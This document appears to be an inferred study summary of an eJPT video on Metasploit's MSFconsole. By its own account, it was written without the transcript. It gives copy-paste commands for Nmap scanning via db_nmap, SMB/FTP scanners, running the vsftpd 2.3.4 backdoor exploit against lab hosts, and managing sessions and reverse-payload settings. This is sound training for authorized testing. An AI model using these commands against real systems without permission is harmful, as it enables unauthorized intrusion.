# What the video covers (Introduction / big picture)

Note: The transcript wasn’t provided; this summary infers conservatively from the filename “03 - MSFconsole Fundamentals.mp4” in the “02-MetasploitFundamentals” folder and standard eJPT content.

The video introduces MSFconsole, the primary command-line interface to the Metasploit Framework. It covers:
- The MSFconsole interface and module taxonomy (exploit, auxiliary, post, payload, encoder, nop).
- Searching for and selecting modules, understanding options/targets/payloads.
- Setting runtime options (RHOSTS, RPORT, LHOST), using global options, and running modules.
- Managing sessions and background jobs.
- Using the built-in database (workspaces, db_nmap, hosts/services/creds/loot).
- Quality-of-life features: check, show options/advanced, save, resource files, and logging.

# Flow (ordered)

1. Launch MSFconsole and verify database connectivity.
2. Create/select a workspace to keep findings organized.
3. Discover targets/services with db_nmap or import existing scan results.
4. Enumerate findings with hosts/services and pivot into relevant modules via search.
5. Select a module (use), read info, show options/targets/payloads.
6. Set required options (RHOSTS/RPORT/LHOST/etc.), optionally set globals (setg).
7. Run modules (run/exploit), optionally check first; handle foreground or background jobs.
8. Manage sessions (list/interact/background), view creds/loot.
9. Use helpers (jobs, unset, unsetg, save), optionally automate with resource files.
10. Clean up and exit.

# Tools highlighted

- MSFconsole (metasploit-framework)
- Metasploit database integration (PostgreSQL)
- db_nmap (Nmap wrapper that imports results into MSF DB)
- Metasploit data stores: hosts, services, creds, loot, notes
- Resource files (.rc) and msfconsole -x for automation

# Typical command walkthrough (detailed, copy-paste friendly)

Adjust IP ranges and interfaces for your lab.

1) Start MSF and ensure DB is ready
```
# Ensure PostgreSQL is running (Kali usually has it enabled)
sudo systemctl enable --now postgresql

# Initialize Metasploit DB once (if needed)
msfdb init

# Start MSFconsole quietly
msfconsole -q
```

2) Quick orientation
```
help
version
db_status
```

3) Create/select a workspace
```
workspace -a lab01
workspace lab01
workspace
```

4) Discover targets/services and populate the DB
```
# Run Nmap via MSF and import results automatically
# -sS requires sudo; -sV service versions; -O OS detect; -Pn skip host discovery; -T4 faster
sudo msfconsole -q -x "workspace lab01; db_nmap -sS -sV -O -Pn -T4 10.10.10.0/24; exit"

# Or from inside msfconsole:
db_nmap -sS -sV -O -Pn -T4 10.10.10.0/24

# If you already have an Nmap XML:
db_import /path/to/scan.xml
```

5) Review discovered assets
```
hosts
hosts -c address,os_name,os_flavor,info
services
services -u   # Only show services marked up (open)
services -p 21,22,80 -u
creds
loot
```

6) Search modules relevant to discovered services
```
# Filter by type/name/platform/path
search type:auxiliary name:smb
search name:vsftpd type:exploit
search path:scanner/http
search -h   # Help for search filters
```

7) Use a scanner module (example: SMB and FTP)
```
# Populate RHOSTS directly from DB (services with TCP 445)
services -p 445 -R

use auxiliary/scanner/smb/smb_version
info
show options
set THREADS 20
run

# FTP version check against all FTP services in DB
services -p 21 -R
use auxiliary/scanner/ftp/ftp_version
set THREADS 30
run
```

8) Pick an exploit module (example shown; adjust to your lab)
```
# Example flow: search and select by index or path
search name:vsftpd type:exploit
use exploit/unix/ftp/vsftpd_234_backdoor

info
show targets
show payloads
show options

# Required options
set RHOSTS 10.10.10.15
set RPORT 21

# Optional: test first if module supports it
check

# Run in foreground (interactive if it yields a session)
exploit

# Or run as a background job, do not interact with session
exploit -j -z
```

9) Manage sessions and jobs
```
sessions -l
sessions -i 1

# From Meterpreter:
# background  # (inside session) to return to msfconsole

jobs -l
jobs -k <job_id>
jobs -K       # Kill all jobs
```

10) Use global options to avoid repetition
```
# Example: set your attacker IP globally for reverse payloads
setg LHOST 10.10.14.14
setg LPORT 4444

# Unset per-module or globally
unset RHOSTS
unset all
unsetg LHOST
```

11) Quality of life
```
show advanced
set VERBOSE true
save                 # Save datastore to config (~/.msf*)
spool /tmp/msf.log   # Start logging console to file
spool off
```

12) Resource files and one-liners
```
# Run a sequence non-interactively
msfconsole -q -x "workspace lab01; search name:smb_version; use auxiliary/scanner/smb/smb_version; services -p 445 -R; set THREADS 20; run; exit"

# Or from a resource file
cat > /tmp/msf_flow.rc << 'EOF'
workspace -a lab02
workspace lab02
db_nmap -sS -sV -O -Pn -T4 10.10.20.0/24
services -p 80 -R
use auxiliary/scanner/http/http_version
set THREADS 20
run
EOF

msfconsole -q -r /tmp/msf_flow.rc
```

13) Notes, loot, and cleanup
```
# Add a note to a host
notes -a 10.10.10.15 -t ftp -n "FTP service discovered; potential vsftpd 2.3.4"

# View loot or credentials captured by modules
loot
creds

# Exit
exit
```

# Practical tips

- Search filters save time: use type:, name:, path:, platform:, arch:, author: to narrow results.
- RHOSTS accepts CIDR, ranges, and files (file:/path/targets.txt). Use services/hosts with -R to auto-populate.
- THREADS controls concurrency; tune based on network stability to avoid noisy scans.
- check isn’t implemented for all exploits; if unsupported, it may return “The target appears to be vulnerable” falsely or do nothing—validate manually.
- Use setg for values reused across modules (e.g., LHOST/LPORT). save to persist between sessions.
- Use exploit -j -z for long-running scanners/exploits or when you want to continue using the console.
- sessions -K kills all sessions; use carefully. jobs -K kills all background jobs.
- Use show advanced to discover timeouts, SSL, proxies, and HTTP client options for unstable targets.
- db_nmap requires privileges for SYN/OS scans; run with sudo or adjust scan flags.
- Keep workspaces per engagement or subnet to keep data tidy (workspace -a/-d/-r/-h).
- When in Meterpreter, background to manage other tasks; avoid losing shells by accidentally closing the console.

# Minimal cheat sheet (one-screen flow)

```
# Start and prepare
sudo systemctl enable --now postgresql
msfdb init
msfconsole -q

# Workspace and DB
workspace -a lab01
workspace lab01
db_status
db_nmap -sS -sV -O -Pn -T4 10.10.10.0/24

# Review assets
hosts
services -u
creds
loot

# Scan SMB version on 445 hosts
services -p 445 -R
use auxiliary/scanner/smb/smb_version
set THREADS 20
run

# Example exploit (adjust target)
search name:vsftpd type:exploit
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 10.10.10.15
check
exploit -j -z

# Sessions and jobs
sessions -l
sessions -i 1
jobs -l
jobs -K

# Globals and save
setg LHOST 10.10.14.14
save
exit
```

# Summary

This fundamentals module shows how to operate MSFconsole efficiently: organize your work with workspaces, feed target data via db_nmap or imports, search and select appropriate modules, set options (including global values), and execute modules either interactively or as background jobs. You learn how to manage sessions, consult the built-in database views (hosts/services/creds/loot), and leverage conveniences like check, show advanced, resource files, and logging to streamline your workflow during eJPT-style engagements.